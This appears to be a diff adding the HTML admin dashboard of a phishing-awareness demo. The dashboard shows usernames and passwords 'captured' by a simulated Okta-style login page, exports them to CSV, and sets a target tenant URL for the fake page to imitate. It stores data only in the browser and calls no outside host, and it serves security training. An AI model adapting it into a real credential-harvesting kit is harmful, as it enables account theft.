@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Credential Harvesting Monitor</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 50%, #16213e 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(120, 0, 255, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(0, 255, 255, 0.08) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+            display: flex;
+            gap: 30px;
+        }
+
+        /* Sidebar Navigation */
+        .sidebar {
+            width: 280px;
+            flex-shrink: 0;
+        }
+
+        .sidebar-menu {
+            background: linear-gradient(135deg, rgba(30, 30, 60, 0.8) 0%, rgba(20, 20, 40, 0.8) 100%);
+            backdrop-filter: blur(20px);
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            position: sticky;
+            top: 20px;
+        }
+
+        .sidebar-title {
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #7b7b8c;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+
+        .sidebar-item {
+            padding: 14px 16px;
+            margin-bottom: 8px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #b0b0c0;
+            font-size: 14px;
+            font-weight: 500;
+            border: 1px solid transparent;
+        }
+
+        .sidebar-item:hover {
+            background: rgba(123, 47, 247, 0.1);
+            border-color: rgba(123, 47, 247, 0.3);
+            color: #e0e0e0;
+            transform: translateX(5px);
+        }
+
+        .sidebar-item.active {
+            background: linear-gradient(135deg, rgba(123, 47, 247, 0.3), rgba(0, 212, 255, 0.2));
+            border-color: rgba(123, 47, 247, 0.5);
+            color: #ffffff;
+            box-shadow: 0 4px 15px rgba(123, 47, 247, 0.3);
+        }
+
+        .sidebar-item-icon {
+            font-size: 20px;
+            width: 24px;
+            text-align: center;
+        }
+
+        .sidebar-item-text {
+            flex: 1;
+        }
+
+        .sidebar-badge {
+            background: rgba(255, 193, 7, 0.3);
+            color: #ffd43b;
+            padding: 2px 8px;
+            border-radius: 8px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .main-content {
+            flex: 1;
+            min-width: 0;
+        }
+
+        /* Tab Content */
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Coming Soon Sections */
+        .coming-soon-container {
+            background: linear-gradient(135deg, rgba(30, 30, 60, 0.8) 0%, rgba(20, 20, 40, 0.8) 100%);
+            backdrop-filter: blur(20px);
+            border-radius: 16px;
+            padding: 80px 60px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .coming-soon-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+
+        .coming-soon-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .coming-soon-text {
+            font-size: 16px;
+            color: #b0b0c0;
+            line-height: 1.8;
+            max-width: 600px;
+            margin: 0 auto 30px;
+        }
+
+        .coming-soon-badge {
+            display: inline-block;
+            padding: 12px 30px;
+            background: linear-gradient(135deg, rgba(255, 193, 7, 0.3), rgba(255, 152, 0, 0.3));
+            border: 1px solid rgba(255, 193, 7, 0.5);
+            border-radius: 25px;
+            color: #ffd43b;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 12px;
+        }
+
+        /* Responsive Sidebar */
+        @media (max-width: 1024px) {
+            .container {
+                flex-direction: column;
+            }
+
+            .sidebar {
+                width: 100%;
+            }
+
+            .sidebar-menu {
+                position: static;
+            }
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, rgba(30, 30, 60, 0.9) 0%, rgba(20, 20, 40, 0.9) 100%);
+            backdrop-filter: blur(20px);
+            border-radius: 16px;
+            padding: 40px;
+            margin: 0 auto 30px;
+            max-width: 1400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            position: relative;
+            z-index: 1;
+        }
+
+        .header-title {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header-subtitle {
+            font-size: 16px;
+            opacity: 0.8;
+            line-height: 1.6;
+            color: #b0b0c0;
+        }
+
+        .warning-banner {
+            background: linear-gradient(135deg, rgba(255, 107, 107, 0.2), rgba(238, 90, 36, 0.2));
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            text-align: center;
+            font-weight: 600;
+            box-shadow: 0 4px 20px rgba(238, 90, 36, 0.4);
+            border: 1px solid rgba(255, 107, 107, 0.3);
+        }
+
+        /* Stats */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, rgba(30, 30, 60, 0.8) 0%, rgba(20, 20, 40, 0.8) 100%);
+            backdrop-filter: blur(20px);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #00d4ff, #7b2ff7, #ff006e);
+            opacity: 0.6;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+
+        .stat-value {
+            font-size: 52px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .stat-label {
+            font-size: 13px;
+            opacity: 0.7;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #a0a0b0;
+        }
+
+        /* Configuration Panel */
+        .config-panel {
+            background: linear-gradient(135deg, rgba(30, 30, 60, 0.8) 0%, rgba(20, 20, 40, 0.8) 100%);
+            backdrop-filter: blur(20px);
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .config-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #e0e0e0;
+        }
+
+        .config-form {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .config-input {
+            flex: 1;
+            min-width: 300px;
+            padding: 14px 18px;
+            font-size: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            background: rgba(10, 10, 25, 0.6);
+            color: #e0e0e0;
+            transition: all 0.3s ease;
+        }
+
+        .config-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .config-input:focus {
+            outline: none;
+            border-color: #7b2ff7;
+            background: rgba(10, 10, 25, 0.8);
+            box-shadow: 0 0 0 3px rgba(123, 47, 247, 0.2),
+                        0 4px 12px rgba(0, 212, 255, 0.1);
+        }
+
+        .btn-update {
+            background: linear-gradient(135deg, #ff9800, #ff5722);
+            color: white;
+            padding: 14px 28px;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(255, 152, 0, 0.3);
+        }
+
+        .btn-update:hover {
+            background: linear-gradient(135deg, #fb8c00, #f4511e);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 152, 0, 0.5);
+        }
+
+        .config-status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .config-status.success {
+            background: rgba(40, 167, 69, 0.2);
+            border: 1px solid rgba(40, 167, 69, 0.5);
+            color: #a8e6af;
+        }
+
+        .config-status.error {
+            background: rgba(220, 53, 69, 0.2);
+            border: 1px solid rgba(220, 53, 69, 0.5);
+            color: #ffb3ba;
+        }
+
+        /* Controls */
+        .controls {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .control-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        button {
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn-refresh {
+            background: linear-gradient(135deg, #28a745, #20c997);
+            color: white;
+        }
+
+        .btn-refresh:hover {
+            background: linear-gradient(135deg, #218838, #17a2b8);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.5);
+        }
+
+        .btn-clear {
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
+        }
+
+        .btn-clear:hover {
+            background: linear-gradient(135deg, #c82333, #bd2130);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(220, 53, 69, 0.5);
+        }
+
+        .btn-export {
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            color: white;
+        }
+
+        .btn-export:hover {
+            background: linear-gradient(135deg, #0056b3, #004085);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.5);
+        }
+
+        .btn-back {
+            background: linear-gradient(135deg, #6c757d, #5a6268);
+            color: white;
+        }
+
+        .btn-back:hover {
+            background: linear-gradient(135deg, #5a6268, #495057);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(108, 117, 125, 0.5);
+        }
+
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(10, 10, 25, 0.6);
+            padding: 10px 18px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .auto-refresh input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        /* Table */
+        .table-container {
+            background: linear-gradient(135deg, rgba(30, 30, 60, 0.8) 0%, rgba(20, 20, 40, 0.8) 100%);
+            backdrop-filter: blur(20px);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        thead {
+            background: linear-gradient(135deg, rgba(10, 10, 30, 0.6), rgba(20, 20, 40, 0.6));
+        }
+
+        th {
+            padding: 18px 15px;
+            text-align: left;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 1.5px;
+            border-bottom: 2px solid rgba(123, 47, 247, 0.3);
+            color: #b0b0c0;
+        }
+
+        td {
+            padding: 16px 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            color: #d0d0d0;
+        }
+
+        tbody tr {
+            transition: all 0.3s ease;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        tbody tr:hover {
+            background: rgba(123, 47, 247, 0.1);
+            transform: scale(1.01);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .password-cell {
+            font-family: 'Courier New', monospace;
+            background: rgba(220, 53, 69, 0.3);
+            padding: 6px 12px;
+            border-radius: 6px;
+            display: inline-block;
+            border: 1px solid rgba(220, 53, 69, 0.4);
+            color: #ff6b6b;
+        }
+
+        .username-cell {
+            font-family: 'Courier New', monospace;
+            background: rgba(40, 167, 69, 0.3);
+            padding: 6px 12px;
+            border-radius: 6px;
+            display: inline-block;
+            border: 1px solid rgba(40, 167, 69, 0.4);
+            color: #51cf66;
+        }
+
+        .timestamp-cell {
+            font-size: 12px;
+            opacity: 0.7;
+            color: #a0a0b0;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            opacity: 0.7;
+        }
+
+        .empty-state-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+
+        .empty-state-text {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .empty-state-subtext {
+            font-size: 14px;
+            opacity: 0.7;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .badge-success {
+            background: rgba(40, 167, 69, 0.3);
+            border: 1px solid rgba(40, 167, 69, 0.5);
+            color: #51cf66;
+        }
+
+        .badge-warning {
+            background: rgba(255, 193, 7, 0.3);
+            border: 1px solid rgba(255, 193, 7, 0.5);
+            color: #ffd43b;
+        }
+
+        .live-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(40, 167, 69, 0.2);
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #28a745;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-title {
+                font-size: 24px;
+            }
+
+            .stats-container {
+                grid-template-columns: 1fr;
+            }
+
+            .controls {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .control-group {
+                flex-direction: column;
+            }
+
+            button {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1 class="header-title">
+            <span>🛡️</span>
+            OktaAdversary Admin Panel
+        </h1>
+        <p class="header-subtitle">
+            This dashboard demonstrates how threat actors monitor and harvest credentials from phishing sites.
+            All data shown here is captured from the simulated phishing login page for educational purposes.
+        </p>
+    </div>
+
+    <div class="container">
+        <!-- Sidebar Navigation -->
+        <div class="sidebar">
+            <div class="sidebar-menu">
+                <div class="sidebar-title">Attack Vectors</div>
+                <div class="sidebar-item active" onclick="showTab('aitm')">
+                    <span class="sidebar-item-icon">🎣</span>
+                    <span class="sidebar-item-text">Adversary-in-the-Middle</span>
+                </div>
+                <div class="sidebar-item" onclick="showTab('credential-stuffing')">
+                    <span class="sidebar-item-icon">🔑</span>
+                    <span class="sidebar-item-text">Credential Stuffing & Password Spraying</span>
+                    <span class="sidebar-badge">Soon</span>
+                </div>
+                <div class="sidebar-item" onclick="showTab('mfa-fatigue')">
+                    <span class="sidebar-item-icon">📱</span>
+                    <span class="sidebar-item-text">MFA Fatigue</span>
+                    <span class="sidebar-badge">Soon</span>
+                </div>
+                <div class="sidebar-item" onclick="showTab('session-hijacking')">
+                    <span class="sidebar-item-icon">🔓</span>
+                    <span class="sidebar-item-text">Session Hijacking</span>
+                    <span class="sidebar-badge">Soon</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Adversary-in-the-Middle Tab Content -->
+            <div id="tab-aitm" class="tab-content active">
+                <div class="warning-banner">
+            ⚠️ TRAINING ENVIRONMENT ONLY - No real credentials should ever be entered
+        </div>
+
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-value" id="totalCaptured">0</div>
+                <div class="stat-label">Total Captured</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="todayCaptured">0</div>
+                <div class="stat-label">Captured Today</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="lastCaptured">Never</div>
+                <div class="stat-label">Last Capture</div>
+            </div>
+        </div>
+
+        <div class="config-panel">
+            <div class="config-title">
+                <span>🎨</span>
+                Phishing Page Configuration
+            </div>
+            <div class="config-form">
+                <input
+                    type="url"
+                    id="targetUrl"
+                    class="config-input"
+                    placeholder="Enter target URL to model phishing page after (e.g., https://example.okta.com)"
+                    value="https://environmentdemo.okta.com/"
+                >
+                <button class="btn-update" onclick="updatePhishingPage()">
+                    <span>🔄</span>
+                    Update UI
+                </button>
+            </div>
+            <div class="config-status" id="configStatus"></div>
+        </div>
+
+        <div class="controls">
+            <div class="control-group">
+                <button class="btn-refresh" onclick="refreshData()">
+                    <span>🔄</span>
+                    Refresh
+                </button>
+                <button class="btn-export" onclick="exportData()">
+                    <span>📥</span>
+                    Export CSV
+                </button>
+                <button class="btn-clear" onclick="clearData()">
+                    <span>🗑️</span>
+                    Clear All
+                </button>
+                <button class="btn-back" onclick="window.location.href='index.html'">
+                    <span>←</span>
+                    Back to Phishing Demo
+                </button>
+            </div>
+            <div class="auto-refresh">
+                <input type="checkbox" id="autoRefresh" onchange="toggleAutoRefresh()">
+                <label for="autoRefresh">Auto-refresh (5s)</label>
+                <span class="live-indicator" id="liveIndicator" style="display: none;">
+                    <span class="live-dot"></span>
+                    LIVE
+                </span>
+            </div>
+        </div>
+
+        <div class="table-container">
+            <table id="credentialsTable">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Timestamp</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Remember Me</th>
+                        <th>User Agent</th>
+                        <th>Simulated IP</th>
+                    </tr>
+                </thead>
+                <tbody id="credentialsBody">
+                    <!-- Data will be inserted here -->
+                </tbody>
+            </table>
+            <div class="empty-state" id="emptyState">
+                <div class="empty-state-icon">📭</div>
+                <div class="empty-state-text">No credentials captured yet</div>
+                <div class="empty-state-subtext">Visit the phishing demo page and submit test credentials to see them appear here</div>
+            </div>
+        </div>
+            </div>
+            <!-- End Adversary-in-the-Middle Tab -->
+
+            <!-- Credential Stuffing & Password Spraying Tab -->
+            <div id="tab-credential-stuffing" class="tab-content">
+                <div class="coming-soon-container">
+                    <div class="coming-soon-icon">🔑</div>
+                    <h2 class="coming-soon-title">Credential Stuffing & Password Spraying</h2>
+                    <p class="coming-soon-text">
+                        This attack simulation demonstrates how threat actors use stolen credentials from data breaches
+                        to attempt unauthorized access across multiple accounts (credential stuffing) or use common
+                        passwords against many accounts (password spraying).
+                    </p>
+                    <div class="coming-soon-badge">Coming Soon</div>
+                </div>
+            </div>
+
+            <!-- MFA Fatigue Tab -->
+            <div id="tab-mfa-fatigue" class="tab-content">
+                <div class="coming-soon-container">
+                    <div class="coming-soon-icon">📱</div>
+                    <h2 class="coming-soon-title">MFA Fatigue Attack</h2>
+                    <p class="coming-soon-text">
+                        This simulation shows how attackers exploit multi-factor authentication by bombarding users
+                        with repeated MFA push notifications until they approve one out of frustration or confusion,
+                        granting the attacker access to their account.
+                    </p>
+                    <div class="coming-soon-badge">Coming Soon</div>
+                </div>
+            </div>
+
+            <!-- Session Hijacking Tab -->
+            <div id="tab-session-hijacking" class="tab-content">
+                <div class="coming-soon-container">
+                    <div class="coming-soon-icon">🔓</div>
+                    <h2 class="coming-soon-title">Session Hijacking</h2>
+                    <p class="coming-soon-text">
+                        This demonstration illustrates how attackers steal or manipulate session tokens and cookies
+                        to impersonate legitimate users and gain unauthorized access to their authenticated sessions
+                        without needing credentials.
+                    </p>
+                    <div class="coming-soon-badge">Coming Soon</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let autoRefreshInterval = null;
+
+        // Tab switching functionality
+        function showTab(tabId) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+
+            // Remove active class from all sidebar items
+            document.querySelectorAll('.sidebar-item').forEach(item => {
+                item.classList.remove('active');
+            });
+
+            // Show selected tab
+            document.getElementById('tab-' + tabId).classList.add('active');
+
+            // Add active class to clicked sidebar item
+            event.currentTarget.classList.add('active');
+        }
+
+        // Load and display credentials
+        function loadCredentials() {
+            const credentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
+            const tbody = document.getElementById('credentialsBody');
+            const emptyState = document.getElementById('emptyState');
+
+            if (credentials.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                updateStats(credentials);
+                return;
+            }
+
+            emptyState.style.display = 'none';
+
+            // Sort by timestamp (newest first)
+            credentials.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+            tbody.innerHTML = credentials.map((cred, index) => {
+                const date = new Date(cred.timestamp);
+                const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
+
+                return `
+                    <tr>
+                        <td>${credentials.length - index}</td>
+                        <td class="timestamp-cell">${formattedDate}</td>
+                        <td><span class="username-cell">${escapeHtml(cred.username)}</span></td>
+                        <td><span class="password-cell">${escapeHtml(cred.password)}</span></td>
+                        <td>
+                            ${cred.remember
+                                ? '<span class="badge badge-success">Yes</span>'
+                                : '<span class="badge badge-warning">No</span>'}
+                        </td>
+                        <td style="font-size: 11px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(cred.userAgent)}">
+                            ${escapeHtml(cred.userAgent.substring(0, 50))}...
+                        </td>
+                        <td>${cred.ipSimulated || 'N/A'}</td>
+                    </tr>
+                `;
+            }).join('');
+
+            updateStats(credentials);
+        }
+
+        function updateStats(credentials) {
+            // Total captured
+            document.getElementById('totalCaptured').textContent = credentials.length;
+
+            // Today's captures
+            const today = new Date().toDateString();
+            const todayCount = credentials.filter(cred =>
+                new Date(cred.timestamp).toDateString() === today
+            ).length;
+            document.getElementById('todayCaptured').textContent = todayCount;
+
+            // Last captured
+            if (credentials.length > 0) {
+                const lastTimestamp = new Date(credentials[credentials.length - 1].timestamp);
+                const now = new Date();
+                const diffMs = now - lastTimestamp;
+                const diffMins = Math.floor(diffMs / 60000);
+
+                let timeAgo;
+                if (diffMins < 1) {
+                    timeAgo = 'Just now';
+                } else if (diffMins < 60) {
+                    timeAgo = `${diffMins}m ago`;
+                } else if (diffMins < 1440) {
+                    timeAgo = `${Math.floor(diffMins / 60)}h ago`;
+                } else {
+                    timeAgo = `${Math.floor(diffMins / 1440)}d ago`;
+                }
+
+                document.getElementById('lastCaptured').textContent = timeAgo;
+                document.getElementById('lastCaptured').style.fontSize = '24px';
+            } else {
+                document.getElementById('lastCaptured').textContent = 'Never';
+            }
+        }
+
+        function refreshData() {
+            loadCredentials();
+
+            // Visual feedback
+            const btn = event.target.closest('button');
+            btn.style.transform = 'rotate(360deg)';
+            setTimeout(() => {
+                btn.style.transform = '';
+            }, 500);
+        }
+
+        function clearData() {
+            if (confirm('⚠️ Are you sure you want to clear all captured credentials?\n\nThis action cannot be undone.')) {
+                localStorage.removeItem('capturedCredentials');
+                loadCredentials();
+            }
+        }
+
+        function exportData() {
+            const credentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
+
+            if (credentials.length === 0) {
+                alert('No data to export!');
+                return;
+            }
+
+            // Create CSV content
+            const headers = ['Timestamp', 'Username', 'Password', 'Remember Me', 'User Agent', 'Simulated IP'];
+            const csvContent = [
+                headers.join(','),
+                ...credentials.map(cred => [
+                    new Date(cred.timestamp).toISOString(),
+                    `"${cred.username}"`,
+                    `"${cred.password}"`,
+                    cred.remember ? 'Yes' : 'No',
+                    `"${cred.userAgent}"`,
+                    cred.ipSimulated || 'N/A'
+                ].join(','))
+            ].join('\n');
+
+            // Download CSV
+            const blob = new Blob([csvContent], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `captured-credentials-${new Date().toISOString().split('T')[0]}.csv`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        function updatePhishingPage() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            const statusDiv = document.getElementById('configStatus');
+
+            if (!targetUrl || !targetUrl.startsWith('http')) {
+                statusDiv.textContent = '❌ Please enter a valid URL starting with http:// or https://';
+                statusDiv.className = 'config-status error';
+                statusDiv.style.display = 'block';
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                }, 5000);
+                return;
+            }
+
+            // Store the target URL in localStorage
+            localStorage.setItem('phishingTargetUrl', targetUrl);
+
+            // Show success message
+            statusDiv.textContent = `✓ Configuration saved! The phishing page will now model itself after: ${targetUrl}`;
+            statusDiv.className = 'config-status success';
+            statusDiv.style.display = 'block';
+
+            // Trigger reload notification
+            setTimeout(() => {
+                if (confirm('Configuration saved successfully!\n\nWould you like to open the phishing demo page to see the changes?')) {
+                    window.open('index.html', '_blank');
+                }
+            }, 1000);
+        }
+
+        function toggleAutoRefresh() {
+            const checkbox = document.getElementById('autoRefresh');
+            const liveIndicator = document.getElementById('liveIndicator');
+
+            if (checkbox.checked) {
+                autoRefreshInterval = setInterval(loadCredentials, 5000);
+                liveIndicator.style.display = 'inline-flex';
+            } else {
+                if (autoRefreshInterval) {
+                    clearInterval(autoRefreshInterval);
+                    autoRefreshInterval = null;
+                }
+                liveIndicator.style.display = 'none';
+            }
+        }
+
+        function escapeHtml(text) {
+            const map = {
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#039;'
+            };
+            return text.replace(/[&<>"']/g, m => map[m]);
+        }
+
+        // Load data on page load
+        loadCredentials();
+
+        // Listen for storage changes (when credentials are captured in another tab)
+        window.addEventListener('storage', function(e) {
+            if (e.key === 'capturedCredentials') {
+                loadCredentials();
+            }
+        });
+    </script>
+</body>
+</html>
